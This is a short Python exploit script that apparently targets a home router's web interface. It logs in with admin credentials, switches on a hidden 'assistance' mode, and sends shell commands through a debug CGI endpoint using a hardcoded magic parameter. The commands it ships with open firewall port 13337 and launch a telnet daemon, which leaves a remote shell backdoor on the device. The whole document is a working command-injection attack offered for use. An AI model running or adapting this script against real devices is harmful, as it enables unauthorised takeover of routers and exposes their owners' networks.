#!/usr/bin/env python3
import requests

# Changable Items
IP_ADDR = "192.168.0.1"
WEBUI_USR = "admin2"
WEBUI_PWD = "admin2"
COMMAND_LIST = [
    "iptables -A INPUT -p tcp --dport 13337 -j ACCEPT",
    "/usr/sbin/telnetd -p 13337",
]
VERBOSE = True

# URLs needed
url_service = f"http://{IP_ADDR}/cgi/service.cgi"
url_cmd = f"http://{IP_ADDR}/sess-bin/d.cgi"

login_req = {
    "method": "session/login",
    "params": {
        "id": WEBUI_USR,
        "pw": WEBUI_PWD,
    }
}
assistance_req = {
    "method": "assistance/config",
    "params": True,
}
headers_service = {"Content-Type": "application/json"}

# Create session and login
s = requests.Session()
resp1 = s.post(url_service, headers=headers_service, json=login_req)

# Enable "assistance" to allow command injection
resp2 = s.post(url_service, headers=headers_service, json=assistance_req)

# Execute all command in list
for cmd in COMMAND_LIST:
    cmd_req = {
        "act": "1",
        "fname": "",
        "cmd": cmd,
        "aaksjdkfj": "!@dnjsrurelqjrm*&",
        "dapply": " Show "
    }
    res = s.get(url_cmd, params=cmd_req)
    if VERBOSE:
        print(f"{res.text}")
